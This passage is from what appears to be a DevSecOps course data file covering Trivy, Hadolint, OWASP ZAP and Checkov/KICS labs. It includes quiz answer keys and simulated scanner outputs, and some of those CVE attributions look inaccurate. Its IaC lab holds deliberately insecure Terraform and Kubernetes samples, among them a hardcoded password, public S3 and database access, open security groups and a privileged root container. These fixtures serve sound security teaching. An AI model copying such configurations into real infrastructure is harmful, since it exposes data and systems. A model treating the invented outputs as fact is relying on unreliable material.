            { rank: 2, label: 'python:3.12-slim', count: 34, color: '#F59E0B' },
            { rank: 3, label: 'python:3.12-alpine', count: 8, color: '#22C55E' },
            { rank: 4, label: 'gcr.io/distroless/python3', count: 2, color: '#22C55E' },
          ] },
        ] },
        { heading: 'Dockerfile Linting vs Image Scanning', blocks: [
          { type: 'text', content: 'Hadolint and Trivy serve different purposes. Hadolint checks your Dockerfile instructions for best practice violations BEFORE building. Trivy scans the built image for known CVEs. Both are needed for a complete container security strategy.' },
          { type: 'comparison', items: [
            { title: 'Hadolint (Dockerfile Linter)', color: '#3B82F6', points: [
              'Checks Dockerfile best practices',
              'Runs BEFORE the image is built',
              'Catches: missing USER, latest tag, missing HEALTHCHECK',
              'Based on Dockerfile best practice rules',
            ] },
            { title: 'Trivy (Image Scanner)', color: '#A78BFA', points: [
              'Scans the built image for CVEs',
              'Runs AFTER the image is built',
              'Catches: vulnerable OS packages, library CVEs',
              'Checks against NVD and vendor databases',
            ] },
          ] },
          { type: 'scan-output', tool: 'hadolint', title: 'Hadolint Dockerfile Lint', findings: [
            { type: 'header', text: '$ hadolint Dockerfile.bad' },
            { type: 'finding', text: 'DL3007 — Using latest is prone to errors', severity: 'WARNING', file: 'Dockerfile:1' },
            { type: 'finding', text: 'DL3006 — Always tag the version explicitly', severity: 'WARNING', file: 'Dockerfile:1' },
            { type: 'finding', text: 'DL3002 — Last USER should not be root', severity: 'ERROR', file: 'Dockerfile:4' },
            { type: 'finding', text: 'DL3025 — Use JSON notation for CMD', severity: 'WARNING', file: 'Dockerfile:4' },
            { type: 'summary', text: '1 error, 3 warnings' },
          ] },
        ] },
      ],
    },
    simulation: {
      title: 'Scan Before Deploy',
      scenario: "The team wants to deploy nginx. Your job: scan the image, assess risk, and compare base images.",
      files: {
        'deploy/': {
          'Dockerfile.bad': 'FROM nginx:latest\nCOPY index.html /usr/share/nginx/html/\nEXPOSE 80\nCMD ["nginx", "-g", "daemon off;"]',
          'Dockerfile.good': 'FROM nginx:1.25-alpine\nRUN addgroup -S appgroup && adduser -S appuser -G appgroup\nCOPY --chown=appuser:appgroup index.html /usr/share/nginx/html/\nUSER appuser\nEXPOSE 8080\nHEALTHCHECK CMD wget -q --spider http://localhost:8080 || exit 1\nCMD ["nginx", "-g", "daemon off;"]',
          'index.html': '<!DOCTYPE html><html><body><h1>SecOps Academy</h1></body></html>',
        },
      },
      steps: [
        { objective: 'Scan nginx:latest with Trivy', command: 'trivy image nginx:latest', output: 'nginx:latest (debian 12.5)\n\nOS Packages:     34 vulnerabilities (LOW: 8, MEDIUM: 14, HIGH: 9, CRITICAL: 3)\nApp Libraries:   11 vulnerabilities (LOW: 2, MEDIUM: 5, HIGH: 3, CRITICAL: 1)\n\nTotal: 45 vulnerabilities', followUp: 'How many total vulnerabilities in nginx:latest?', answer: '45', hint: 'Look at the Total line' },
        { objective: 'Filter by CRITICAL severity only', command: 'trivy image --severity CRITICAL nginx:latest', output: 'Total: 4 (CRITICAL: 4)\n\nCVE-2024-0727   openssl    3.0.11   3.0.13   CRITICAL  Denial of Service\nCVE-2023-44487  nghttp2    1.57.0   1.58.0   CRITICAL  HTTP/2 Rapid Reset\nCVE-2023-6246   glibc      2.36     2.36-10  CRITICAL  Buffer overflow\nCVE-2024-1086   libcurl    8.4.0    8.6.0    CRITICAL  Use after free', followUp: 'How many CRITICAL CVEs?', answer: '4', hint: 'Count the CRITICAL findings' },
        { objective: 'Compare OS vulnerabilities vs library vulnerabilities', command: 'trivy image --vuln-type os nginx:latest', output: 'Scanning OS packages only...\nOS Packages: 34 vulnerabilities', followUp: 'How many are in OS packages?', answer: '34', hint: 'The output shows the OS package count' },
        { objective: 'Compare image sizes: regular vs slim vs alpine', command: 'docker images | grep -E "python|nginx"', output: 'python       3.12          abc123   2 weeks ago   1.01GB\npython       3.12-slim     def456   2 weeks ago   155MB\npython       3.12-alpine   ghi789   2 weeks ago   51.8MB\nnginx        latest        jkl012   1 week ago    187MB\nnginx        1.25-alpine   mno345   1 week ago    43.2MB', followUp: 'How much smaller is python:3.12-alpine vs python:3.12?', answer: '~950MB', hint: 'Calculate: 1010MB - 51.8MB ≈ 950MB difference' },
        { objective: 'Lint both Dockerfiles with Hadolint', command: 'hadolint Dockerfile.bad', output: 'Dockerfile.bad:1 DL3007 warning: Using latest is prone to errors\nDockerfile.bad:1 DL3006 warning: Always tag the version of an image explicitly\nDockerfile.bad:4 DL3025 warning: Use arguments JSON notation for CMD\nDockerfile.bad:  DL3002 error: Last USER should not be root\n\n1 error, 3 warnings', followUp: 'How many errors does Hadolint find in the bad Dockerfile?', answer: '1', hint: 'Look at the summary line: 1 error' },
        { objective: 'Scan the Dockerfile with Trivy config scanner', command: 'trivy config Dockerfile.bad', output: 'Dockerfile.bad (dockerfile)\n\nTests: 23, Failures: 3, Warnings: 2\n\nFAIL HIGH: Specify a tag in the \'FROM\' statement (DS001)\nFAIL HIGH: Last USER command should not be root (DS002)\nFAIL MEDIUM: Add HEALTHCHECK instruction (DS026)\nWARN LOW: Consider using COPY instead of ADD (DS005)\nWARN LOW: Pin versions in package managers (DS029)', followUp: 'How many FAIL results from Trivy config scan?', answer: '3', hint: 'Count the FAIL lines' },
      ],
    },
    execute: {
      intro: 'Scan real container images and compare results.',
      commands: [
        { cmd: 'trivy image nginx:latest', desc: 'Full scan of nginx:latest.' },
        { cmd: 'trivy image --severity CRITICAL nginx:latest', desc: 'CRITICAL only.' },
        { cmd: 'trivy image python:3.12-slim', desc: 'Scan slim Python image for comparison.' },
        { cmd: 'trivy image python:3.12-alpine', desc: 'Scan Alpine Python image — note the difference.' },
        { cmd: 'hadolint Dockerfile', desc: 'Lint your Dockerfile.' },
        { cmd: 'trivy config Dockerfile', desc: 'Scan Dockerfile with Trivy config scanner.' },
      ],
    },
    verify: [
      'How many CRITICAL CVEs in nginx:latest right now? (this changes over time!)',
      'What is the size difference between python:3.12 and python:3.12-slim on your machine?',
    ],
    quiz: [
      { q: "Why scan container images, not just source code?", opts: ["Source code doesn't have vulnerabilities", "Images bundle OS packages and libraries that have their own CVEs beyond your application code", "It's faster", "Regulatory requirement only"], answer: 1, explanation: "Container images include an entire OS layer with hundreds of packages. These have vulnerabilities independent of your application code." },
      { q: "What's the advantage of Alpine-based images?", opts: ["They run faster", "Much smaller size = smaller attack surface = fewer vulnerabilities", "They're more compatible", "They include more tools"], answer: 1, explanation: "Alpine images use musl libc and busybox, resulting in images that are often 5-10x smaller than Debian-based equivalents with far fewer packages to be vulnerable." },
      { q: "What's the difference between Hadolint and Trivy image scanning?", opts: ["They do the same thing", "Hadolint checks Dockerfile best practices; Trivy scans the built image for known CVEs", "Hadolint is for containers; Trivy is for code", "They're different names for the same tool"], answer: 1, explanation: "Hadolint is a Dockerfile linter (checks your build instructions). Trivy scans the resulting image (checks installed packages for known vulnerabilities)." },
      { q: "When should you scan container images?", opts: ["Only before the first deployment", "Only when a security team requests it", "At build time in CI/CD, when pushed to registry, and periodically for new CVEs", "Only after a breach"], answer: 2, explanation: "Comprehensive scanning happens at multiple points: during CI/CD build, on push to registry, and periodically to catch newly disclosed CVEs in existing images." },
      { q: "A scan finds 45 vulnerabilities in your base image. What's the best first step?", opts: ["Switch to a different application framework", "Try a smaller base image (slim or Alpine) which likely has far fewer vulnerabilities", "Ignore them — base image vulns aren't your problem", "Report to the image maintainer and wait"], answer: 1, explanation: "Switching to a smaller base image (slim, Alpine, or distroless) is often the fastest way to dramatically reduce vulnerability count, since fewer packages = fewer CVEs." },
    ],
  },
  '2.5': {
    id: '2.5', pathId: 2, title: 'DAST — Dynamic Application Security Testing', baseXP: 120, estTime: '20-35 min',
    hasSim: true, hasExecute: true, hasVerify: true,
    theory: {
      sections: [
        { heading: 'What is DAST?', blocks: [
          { type: 'text', content: 'Dynamic Application Security Testing (DAST) attacks a RUNNING application from the outside, just like a real attacker would. It sends malicious requests and observes responses to find vulnerabilities that only manifest at runtime.' },
          { type: 'callout', variant: 'key-concept', title: 'Black-Box Testing', content: 'DAST tools have no access to source code. They interact with the application through HTTP requests only — testing it the same way an attacker would. This means low false positives: if DAST finds a vulnerability, it has proof the vulnerability is exploitable.' },
          { type: 'attack-flow', steps: [
            { type: 'info', label: 'Spider/Crawl', detail: 'DAST discovers all pages, forms, and API endpoints by following links' },
            { type: 'attack', label: 'Send Payloads', detail: 'Sends attack strings (SQL injection, XSS, path traversal) to every input' },
            { type: 'info', label: 'Analyze Responses', detail: 'Checks if the application responds in a way that indicates vulnerability' },
            { type: 'defense', label: 'Generate Report', detail: 'Produces findings with evidence, severity, and remediation guidance' },
          ] },
        ] },
        { heading: 'Passive vs Active Scanning', blocks: [
          { type: 'comparison', items: [
            { title: 'Passive Scanning', color: '#22C55E', points: [
              'Observes traffic without sending attack payloads',
              'Finds: missing security headers, cookie flags, info leakage',
              'Safe for production environments',
              'Fast — typically completes in 1-2 minutes',
              'Good for: every build in CI/CD pipeline',
            ] },
            { title: 'Active Scanning', color: '#EF4444', points: [
              'Sends actual attack payloads (SQLi, XSS, fuzzing)',
              'Finds: injection vulnerabilities, auth bypass, CSRF',
              'Can modify data or cause crashes — NEVER use on production',
              'Slow — can take 10-60+ minutes',
              'Good for: staging/QA, nightly scans, pre-release',
            ] },
          ] },
          { type: 'callout', variant: 'warning', title: 'Active Scans Are Destructive', content: 'Active scanning sends real attack payloads that can corrupt data, create accounts, trigger alerts, or crash applications. ONLY run active scans against test environments that you own and can restore.' },
        ] },
        { heading: 'SAST vs DAST', blocks: [
          { type: 'text', content: 'SAST and DAST are complementary — each finds vulnerabilities the other misses. A mature security program uses both, running at different stages of the development lifecycle.' },
          { type: 'comparison', items: [
            { title: 'SAST', color: '#3B82F6', points: [
              'Analyzes source code (white-box)',
              'Runs at build time — no running app needed',
              'Full code coverage, finds code-level bugs',
              'Higher false positive rate',
              'Misses: runtime config, auth issues, headers',
            ] },
            { title: 'DAST', color: '#A78BFA', points: [
              'Tests running application (black-box)',
              'Runs after deployment to staging/test',
              'Proves vulnerabilities are exploitable',
              'Lower false positive rate',
              'Misses: code-level issues, dead code paths',
            ] },
          ] },
          { type: 'pipeline', stages: [
            { label: 'Code Commit', icon: 'git', desc: 'Developer pushes code', security: false, tool: 'git' },
            { label: 'SAST Scan', icon: 'code', desc: 'Semgrep analyzes source', security: true, tool: 'semgrep' },
            { label: 'Build & Deploy', icon: 'box', desc: 'Deploy to staging', security: false, tool: 'docker' },
            { label: 'DAST Scan', icon: 'target', desc: 'ZAP attacks running app', security: true, tool: 'zap' },
            { label: 'Release Gate', icon: 'lock', desc: 'Pass/fail decision', security: true, tool: 'ci-cd' },
          ] },
        ] },
        { heading: 'OWASP ZAP', blocks: [
          { type: 'text', content: 'OWASP ZAP (Zed Attack Proxy) is the most popular open-source DAST tool. It runs as a Docker container, making it ideal for CI/CD integration.' },
          { type: 'steps', steps: [
            { label: 'Baseline Scan', detail: 'zap-baseline.py — Passive scan only. Runs in ~1 minute. Checks security headers, cookies, info leakage. Safe for any environment.' },
            { label: 'Full Scan', detail: 'zap-full-scan.py — Passive + active scanning. Runs in 10-60 minutes. Finds injection, XSS, CSRF, and more. Only for test environments.' },
            { label: 'API Scan', detail: 'zap-api-scan.py — Targets API endpoints using OpenAPI/Swagger specs. Tests each endpoint with relevant attack payloads.' },
          ] },
          { type: 'scan-output', tool: 'zap', title: 'ZAP Baseline Scan Output', findings: [
            { type: 'header', text: '$ zap-baseline.py -t http://localhost:3000' },
            { type: 'finding', text: 'X-Frame-Options Header Not Set [10020]', severity: 'MEDIUM', file: '3 instances' },
            { type: 'finding', text: 'Server Leaks Version Info [10036]', severity: 'LOW', file: '2 instances' },
            { type: 'finding', text: 'Cookie No HttpOnly Flag [10010]', severity: 'MEDIUM', file: '4 instances' },
            { type: 'finding', text: 'Cookie Without Secure Flag [10011]', severity: 'MEDIUM', file: '4 instances' },
            { type: 'finding', text: 'Content-Type Header Missing [10019]', severity: 'LOW', file: '1 instance' },
            { type: 'summary', text: 'FAIL-NEW: 0  WARN-NEW: 7  INFO: 2  PASS: 42' },
          ] },
        ] },
        { heading: 'When to Use DAST', blocks: [
          { type: 'text', content: 'DAST requires a running application, so it runs later in the pipeline than SAST or SCA. The key is choosing the right scan type for each stage.' },
          { type: 'pipeline', stages: [
            { label: 'Every Build', icon: 'refresh', desc: 'Baseline (passive) scan', security: true, tool: 'zap-baseline' },
            { label: 'Nightly', icon: 'clock', desc: 'Full (active) scan on staging', security: true, tool: 'zap-full' },
            { label: 'Pre-Release', icon: 'shield', desc: 'Full scan + API scan', security: true, tool: 'zap-api' },
            { label: 'Production', icon: 'lock', desc: 'Passive monitoring ONLY', security: true, tool: 'monitoring' },
          ] },
          { type: 'callout', variant: 'warning', title: 'Never Active Scan Production', content: 'Active DAST scans send attack payloads that can corrupt data, create unwanted records, or crash the application. Run active scans ONLY against staging or test environments. For production, use passive scanning or external monitoring services.' },
        ] },
      ],
    },
    simulation: {
      title: 'Attack the Running App',
      scenario: "OWASP Juice Shop is deployed to staging. Run dynamic scans to find vulnerabilities that static analysis would miss.",
      files: {
        'dast-lab/': {
          'docker-compose.yml': 'version: "3"\nservices:\n  juice-shop:\n    image: bkimminich/juice-shop\n    ports:\n      - "3000:3000"\n  zap:\n    image: zaproxy/zap-stable\n    depends_on:\n      - juice-shop',
          'scan-baseline.sh': '#!/bin/bash\necho "Running ZAP baseline scan against Juice Shop..."\ndocker run --rm zaproxy/zap-stable \\\n  zap-baseline.py -t http://juice-shop:3000',
          'scan-full.sh': '#!/bin/bash\necho "Running ZAP full scan (active) against Juice Shop..."\ndocker run --rm zaproxy/zap-stable \\\n  zap-full-scan.py -t http://juice-shop:3000 -m 5',
        },
      },
      steps: [
        { objective: 'Start Juice Shop for testing', command: 'docker run -d -p 3000:3000 --name juice-shop bkimminich/juice-shop', output: 'Unable to find image \'bkimminich/juice-shop:latest\' locally\nPulling from library...\nStatus: Downloaded\nContainer ID: a1b2c3d4e5f6\n\nJuice Shop is running at http://localhost:3000', followUp: 'What port is Juice Shop running on?', answer: '3000', hint: 'Look at the port mapping: -p 3000:3000' },
        { objective: 'Run ZAP baseline scan (passive)', command: 'zap-baseline.py -t http://localhost:3000', output: 'WARN-NEW: X-Frame-Options Header Not Set [10020] x 3\nWARN-NEW: Missing Anti-clickjacking Header [10020] x 3\nWARN-NEW: Server Leaks Version Information via "Server" HTTP Response Header [10036] x 2\nWARN-NEW: Content-Type Header Missing [10019] x 1\nWARN-NEW: Cookie No HttpOnly Flag [10010] x 4\nWARN-NEW: Cookie Without Secure Flag [10011] x 4\nWARN-NEW: Cross-Domain JavaScript Source File Inclusion [10017] x 2\n\nFAIL-NEW: 0\tWARN-NEW: 7\tINFO: 2\tPASS: 42', followUp: 'How many WARN findings did the baseline scan find?', answer: '7', hint: 'Look at the summary line: WARN-NEW: 7' },
        { objective: 'Analyze the findings — what types of issues?', command: 'cat zap-baseline-report.html', output: '(Report shows all findings organized by risk level)\n\nMedium Risk:\n- Missing security headers (X-Frame-Options, CSP)\n- Cookie security flags missing\n\nLow Risk:\n- Server version information leakage\n- Cross-domain JavaScript inclusion\n\nInformational:\n- Technologies detected (Express.js, Angular)', followUp: 'Are these passive findings or active attack results?', answer: 'passive', hint: 'Baseline scan is passive — it only observes, it doesn\'t attack' },
        { objective: 'Run ZAP full scan (active scanning)', command: 'zap-full-scan.py -t http://localhost:3000 -m 5', output: 'Active scan started... (5 minute limit)\n\nScanning 127 URLs...\n\nHigh Risk:\n  SQL Injection [40018] x 2\n  XSS Reflected [40012] x 3\n  Path Traversal [6] x 1\n\nMedium Risk:\n  CSRF [10202] x 5\n  Session Management [10112] x 2\n\nFAIL-NEW: 3\tWARN-NEW: 8\tINFO: 5\tPASS: 38', followUp: 'How many FAIL (high risk) findings did the full scan find?', answer: '3', hint: 'Look at FAIL-NEW: 3' },
        { objective: 'Run ZAP API scan with OpenAPI spec', command: 'zap-api-scan.py -t api-spec.yaml -f openapi', output: 'API scan using OpenAPI specification...\nEndpoints tested: 12\n\nHigh Risk:\n  SQL Injection in /api/Users [40018]\n\nMedium Risk:\n  Missing rate limiting [10112]\n  Insufficient input validation [90024]\n  CORS misconfiguration [10098]\n\nFAIL-NEW: 1\tWARN-NEW: 4\tPASS: 28', followUp: 'How many API endpoints were tested?', answer: '12', hint: 'Look at "Endpoints tested"' },
      ],
    },
    execute: {
      intro: 'Run real DAST scans against Juice Shop (a deliberately vulnerable app).',
      commands: [
        { cmd: 'docker run -d -p 3000:3000 --name juice-shop bkimminich/juice-shop', desc: 'Start Juice Shop.' },
        { cmd: 'docker run --rm -t zaproxy/zap-stable zap-baseline.py -t http://host.docker.internal:3000', desc: 'Run ZAP baseline (passive) scan.' },
        { cmd: 'docker run --rm -t zaproxy/zap-stable zap-full-scan.py -t http://host.docker.internal:3000 -m 5', desc: 'Run ZAP full (active) scan with 5-min limit.' },
        { cmd: 'docker stop juice-shop && docker rm juice-shop', desc: 'Clean up when done.' },
      ],
    },
    verify: [
      'How many alerts did ZAP baseline scan find on Juice Shop?',
      'Did the full scan find SQL Injection? (yes/no)',
    ],
    quiz: [
      { q: "What's the key difference between SAST and DAST?", opts: ["SAST is newer", "SAST analyzes source code; DAST tests a running application from the outside", "DAST is free; SAST is paid", "They scan different languages"], answer: 1, explanation: "SAST reads source code statically. DAST interacts with a running application by sending requests and observing responses, like a real attacker." },
      { q: "Why should you NOT run active DAST scans against production?", opts: ["It's too slow", "Active scanning sends attack payloads that can modify data or cause crashes", "It doesn't work on production servers", "Legal reasons only"], answer: 1, explanation: "Active scans send actual attack payloads (SQL injection, XSS) that can corrupt data, cause errors, or trigger security alerts. Only scan test environments." },
      { q: "What is a ZAP baseline scan?", opts: ["The first scan ever run", "A passive scan that observes without sending attack payloads", "A scan of the database", "A scan of the source code"], answer: 1, explanation: "ZAP baseline runs a passive spider and passive scanner — it observes the application's responses without sending attack payloads. Safe and fast." },
      { q: "What types of issues does DAST find that SAST typically misses?", opts: ["Syntax errors", "Missing security headers, runtime misconfigurations, authentication bypasses", "Code style issues", "Unused variables"], answer: 1, explanation: "DAST excels at finding runtime issues: missing headers, insecure cookies, CORS misconfig, authentication bypass — things that only manifest in a running application." },
      { q: "In a CI/CD pipeline, when should DAST scans run?", opts: ["Before code is committed", "After deployment to a staging/test environment", "During code review", "Only manually before releases"], answer: 1, explanation: "DAST requires a running application, so it runs after deployment to a test/staging environment in the pipeline." },
    ],
  },
  '2.6': {
    id: '2.6', pathId: 2, title: 'IaC Security Scanning', baseXP: 120, estTime: '20-35 min',
    hasSim: true, hasExecute: true, hasVerify: true,
    theory: {
      sections: [
        { heading: 'What is IaC?', blocks: [
          { type: 'text', content: 'Infrastructure as Code (IaC) defines your cloud infrastructure in version-controlled files instead of manual console clicks. If your infrastructure is code, it can be scanned for security misconfigurations just like application code.' },
          { type: 'keyterms', terms: [
            { term: 'Terraform (.tf)', definition: 'HashiCorp\'s multi-cloud IaC tool. Declarative HCL syntax. The most popular IaC framework.' },
            { term: 'CloudFormation', definition: 'AWS-native IaC in YAML/JSON. Tightly integrated with AWS services.' },
            { term: 'Kubernetes YAML', definition: 'Manifests defining pods, deployments, services. Security contexts control container privileges.' },
            { term: 'Ansible', definition: 'Configuration management and automation. Playbooks define desired system state.' },
            { term: 'Helm Charts', definition: 'Templated Kubernetes manifests. Package manager for K8s deployments.' },
          ] },
          { type: 'callout', variant: 'key-concept', title: 'Shift Left for Infrastructure', content: 'IaC scanning catches misconfigurations at the code review stage — before infrastructure is provisioned. This is orders of magnitude cheaper and safer than finding issues in a running cloud environment.' },
        ] },
        { heading: 'Common Misconfigurations', blocks: [
          { type: 'text', content: 'Misconfigurations are the number one cause of cloud security breaches. Most are preventable with proper IaC scanning. Here are the most common and dangerous misconfigurations that scanners detect.' },
          { type: 'scan-output', tool: 'checkov', title: 'Checkov Terraform Scan', findings: [
            { type: 'header', text: '$ checkov -d . --framework terraform' },
            { type: 'finding', text: 'CKV_AWS_20 — S3 bucket has public ACL', severity: 'CRITICAL', file: 'main.tf:1-4' },
            { type: 'finding', text: 'CKV_AWS_24 — Security group allows 0.0.0.0/0', severity: 'CRITICAL', file: 'main.tf:6-14' },
            { type: 'finding', text: 'CKV_AWS_17 — RDS is publicly accessible', severity: 'CRITICAL', file: 'main.tf:16-23' },
            { type: 'finding', text: 'CKV_AWS_16 — RDS encryption not enabled', severity: 'HIGH', file: 'main.tf:16-23' },
            { type: 'finding', text: 'CKV_AWS_51 — Hardcoded credentials in resource', severity: 'CRITICAL', file: 'main.tf:20' },
            { type: 'finding', text: 'CKV_AWS_18 — S3 bucket missing access logging', severity: 'MEDIUM', file: 'main.tf:1-4' },
            { type: 'summary', text: 'Passed: 5 | Failed: 12 | Skipped: 0' },
          ] },
          { type: 'severity-bars', title: 'Most Common IaC Misconfigurations', items: [
            { rank: 1, label: 'Public S3 Buckets / Storage', count: 31, color: '#EF4444' },
            { rank: 2, label: 'Open Security Groups (0.0.0.0/0)', count: 27, color: '#EF4444' },
            { rank: 3, label: 'Unencrypted Data at Rest', count: 22, color: '#F97316' },
            { rank: 4, label: 'Missing Logging / Monitoring', count: 18, color: '#F59E0B' },
            { rank: 5, label: 'Privileged Containers (K8s)', count: 15, color: '#F59E0B' },
          ] },
        ] },
        { heading: 'Compliance Frameworks', blocks: [
          { type: 'text', content: 'IaC scanners can map findings to compliance frameworks, generating reports that satisfy auditors and demonstrate security posture. Checkov supports all major frameworks out of the box.' },
          { type: 'keyterms', terms: [
            { term: 'CIS Benchmarks', definition: 'Specific configuration baselines from Center for Internet Security. The most widely adopted cloud security standards.' },
            { term: 'SOC 2', definition: 'Service Organization Controls — security, availability, and privacy controls. Required by most enterprise customers.' },
            { term: 'PCI DSS', definition: 'Payment Card Industry Data Security Standard. Required for handling credit card data. Strict encryption and access controls.' },
            { term: 'HIPAA', definition: 'Health Insurance Portability and Accountability Act. Governs protection of health data. Requires encryption, access logging, and audit trails.' },
            { term: 'NIST 800-53', definition: 'US federal security controls framework. Comprehensive control catalog used by government agencies.' },
          ] },
          { type: 'callout', variant: 'tip', title: 'Compliance as Code', content: 'Run checkov -d . --check CIS to scan against CIS benchmarks. The output maps each finding to a specific CIS control, making compliance reporting automatic and auditable.' },
        ] },
        { heading: 'Tool Comparison', blocks: [
          { type: 'comparison', items: [
            { title: 'Checkov', color: '#22C55E', points: [
              '1000+ built-in policies',
              'Multi-framework: Terraform, K8s, CloudFormation, ARM',
              'CIS, SOC2, PCI compliance mapping',
              'Free, open-source (Bridgecrew/Palo Alto)',
            ] },
            { title: 'KICS', color: '#3B82F6', points: [
              'Checkmarx-backed, strong Dockerfile support',
              '847+ queries across IaC frameworks',
              'Good for multi-language Docker scanning',
              'Free, open-source',
            ] },
            { title: 'tfsec', color: '#A78BFA', points: [
              'Terraform-specific, very fast',
              'Now part of Trivy (Aqua Security)',
              'Deep HCL understanding',
              'Integrates with Trivy for unified scanning',
            ] },
          ] },
          { type: 'scan-output', tool: 'checkov', title: 'Checkov Kubernetes Scan', findings: [
            { type: 'header', text: '$ checkov -f k8s-deployment.yaml --framework kubernetes' },
            { type: 'finding', text: 'CKV_K8S_1 — Container running as privileged', severity: 'CRITICAL', file: 'container: app' },
            { type: 'finding', text: 'CKV_K8S_6 — Container running as root (UID 0)', severity: 'HIGH', file: 'container: app' },
            { type: 'finding', text: 'CKV_K8S_12 — Memory limits not set', severity: 'MEDIUM', file: 'container: app' },
            { type: 'finding', text: 'CKV_K8S_13 — CPU limits not set', severity: 'MEDIUM', file: 'container: app' },
            { type: 'finding', text: 'CKV_K8S_22 — readOnlyRootFilesystem not true', severity: 'MEDIUM', file: 'container: app' },
            { type: 'summary', text: 'Passed: 3 | Failed: 5 | Skipped: 0' },
          ] },
          { type: 'callout', variant: 'tip', title: 'Use Multiple Scanners', content: 'Checkov found 12 failures while KICS found 15 on the same code. Different tools have different rule sets — using both gives better coverage.' },
        ] },
      ],
    },
    simulation: {
      title: 'Catch the Misconfigs',
      scenario: "A team submitted Terraform code for review. Find all the security misconfigurations before it reaches production.",
      files: {
        'infra/': {
          'main.tf': 'resource "aws_s3_bucket" "data" {\n  bucket = "company-data-bucket"\n  acl    = "public-read"  # INSECURE: public access\n}\n\nresource "aws_security_group" "wide_open" {\n  name = "allow_all"\n  ingress {\n    from_port   = 0\n    to_port     = 65535\n    protocol    = "tcp"\n    cidr_blocks = ["0.0.0.0/0"]  # INSECURE: open to world\n  }\n}\n\nresource "aws_db_instance" "main" {\n  engine         = "mysql"\n  instance_class = "db.t3.micro"\n  username       = "admin"\n  password       = "password123"  # INSECURE: hardcoded password\n  publicly_accessible = true       # INSECURE: public DB\n  storage_encrypted   = false      # INSECURE: unencrypted\n}\n\nresource "aws_instance" "web" {\n  ami           = "ami-12345678"\n  instance_type = "t3.micro"\n  # Missing: no IMDSv2 required\n  # Missing: no monitoring enabled\n}',
          'k8s-insecure.yaml': 'apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: insecure-app\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: insecure\n  template:\n    metadata:\n      labels:\n        app: insecure\n    spec:\n      containers:\n      - name: app\n        image: ubuntu:latest\n        securityContext:\n          privileged: true        # INSECURE\n          runAsUser: 0            # INSECURE: root\n        ports:\n        - containerPort: 8080\n        # Missing: no resource limits\n        # Missing: no readOnlyRootFilesystem',
          'main-secure.tf': 'resource "aws_s3_bucket" "data" {\n  bucket = "company-data-bucket"\n}\n\nresource "aws_s3_bucket_public_access_block" "data" {\n  bucket = aws_s3_bucket.data.id\n  block_public_acls       = true\n  block_public_policy     = true\n  ignore_public_acls      = true\n  restrict_public_buckets = true\n}\n\nresource "aws_security_group" "web" {\n  name = "web_only"\n  ingress {\n    from_port   = 443\n    to_port     = 443\n    protocol    = "tcp"\n    cidr_blocks = ["10.0.0.0/8"]\n  }\n}',
        },
      },
      steps: [
        { objective: 'Scan the insecure Terraform with Checkov', command: 'checkov -d .', output: 'Passed checks: 5, Failed checks: 12, Skipped: 0\n\nCheck: CKV_AWS_18: "Ensure the S3 bucket has access logging enabled"\n  FAILED for resource: aws_s3_bucket.data\n  File: /main.tf:1-4\n\nCheck: CKV_AWS_19: "Ensure S3 bucket encryption is enabled"\n  FAILED for resource: aws_s3_bucket.data\n\nCheck: CKV_AWS_20: "Ensure S3 bucket does not have public ACL"\n  FAILED for resource: aws_s3_bucket.data\n\nCheck: CKV_AWS_24: "Ensure no security groups allow ingress from 0.0.0.0:0"\n  FAILED for resource: aws_security_group.wide_open\n\nCheck: CKV_AWS_16: "Ensure RDS encryption is enabled"\n  FAILED for resource: aws_db_instance.main\n\nCheck: CKV_AWS_17: "Ensure RDS is not publicly accessible"\n  FAILED for resource: aws_db_instance.main\n\n... (6 more failures)', followUp: 'How many checks failed?', answer: '12', hint: 'Look at "Failed checks: 12"' },
        { objective: 'Identify the most critical findings', command: 'checkov -d . --check HIGH', output: 'CRITICAL findings:\n- Public S3 bucket (CKV_AWS_20)\n- Security group open to 0.0.0.0/0 (CKV_AWS_24)\n- Publicly accessible RDS (CKV_AWS_17)\n- Hardcoded credentials (CKV_AWS_51)\n- Unencrypted database (CKV_AWS_16)', followUp: 'Which resource has the most failed checks?', answer: 'aws_s3_bucket.data', hint: 'The S3 bucket has 3+ failures (logging, encryption, public access)' },
        { objective: 'Scan the secure Terraform for comparison', command: 'checkov -f main-secure.tf', output: 'Passed checks: 8, Failed checks: 2, Skipped: 0\n\nCheck: CKV_AWS_18: "Ensure S3 bucket has access logging"\n  FAILED (logging not configured)\n\nCheck: CKV_AWS_145: "Ensure S3 bucket has server-side encryption"\n  FAILED (encryption not configured)\n\nAll other checks PASSED ✅', followUp: 'Did the secure version pass more or fewer checks?', answer: 'more', hint: 'Secure: 8 passed, 2 failed. Insecure: 5 passed, 12 failed.' },
        { objective: 'Scan Kubernetes manifests', command: 'checkov -f k8s-insecure.yaml', output: 'Check: CKV_K8S_1: "Do not allow containers to run as privileged"\n  FAILED for container: app\n\nCheck: CKV_K8S_6: "Do not allow containers to run with root"\n  FAILED for container: app (runAsUser: 0)\n\nCheck: CKV_K8S_12: "Memory limits should be set"\n  FAILED for container: app\n\nCheck: CKV_K8S_13: "CPU limits should be set"\n  FAILED for container: app\n\nCheck: CKV_K8S_22: "readOnlyRootFilesystem should be true"\n  FAILED for container: app\n\nPassed: 3, Failed: 5', followUp: 'How many K8s checks failed?', answer: '5', hint: 'Look at the summary: Failed: 5' },
        { objective: 'Scan with KICS for comparison', command: 'kics scan -p .', output: 'KICS Scan Results:\n\nFiles scanned: 3\nQueries loaded: 847\n\nHIGH:   6\nMEDIUM: 4\nLOW:    3\nINFO:   2\n\nTotal: 15 results', followUp: 'Did KICS find more or fewer issues than Checkov?', answer: 'more', hint: 'KICS: 15 findings. Checkov: 12 failed checks. Different tools, different rules.' },
        { objective: 'Compare tools side by side', command: 'echo "Checkov: 12 failures | KICS: 15 findings"', output: 'Tool Comparison:\n\nCheckov: 12 failed checks (Terraform + K8s)\n  - Strong policy mapping (CIS, SOC2)\n  - 1000+ built-in policies\n\nKICS: 15 findings\n  - Good Dockerfile support\n  - Different rule set catches different issues\n\nRecommendation: Use both for maximum coverage', followUp: 'Should you rely on just one IaC scanner? (yes/no)', answer: 'no', hint: 'Different tools have different rule sets — using multiple tools gives better coverage' },
      ],
    },
    execute: {
      intro: 'Scan real infrastructure code for misconfigurations.',
      commands: [
        { cmd: 'pip install checkov', desc: 'Install Checkov.' },
        { cmd: 'checkov -d .', desc: 'Scan all IaC files in current directory.' },
        { cmd: 'checkov -f k8s.yaml --framework kubernetes', desc: 'Scan specific K8s manifest.' },
